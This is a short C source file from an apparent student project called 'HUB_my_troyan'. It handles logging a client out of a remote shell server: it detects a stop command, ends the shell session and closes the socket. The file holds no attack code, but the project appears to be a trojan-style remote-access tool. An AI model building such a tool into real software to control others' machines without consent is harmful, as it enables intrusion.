/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 logout_user.c
*/

#include "app.h"

bool is_logout_command(const char *command)
{
    for (size_t i = 0; command[i] != '\0'; i++) {
        if (false == isblank(command[i])) {
            if (strncmp(&command[i], STOP_CMD, strlen(STOP_CMD)) == 0) {
                return true;
            }
            return false;
        }
    }
    return false;
}

void logout_user(server_t *server)
{
    if (server->client_connected) {
        shell_stop(&server->shell);
        socket_close(&server->client);
        server->client_connected = false;
    }
}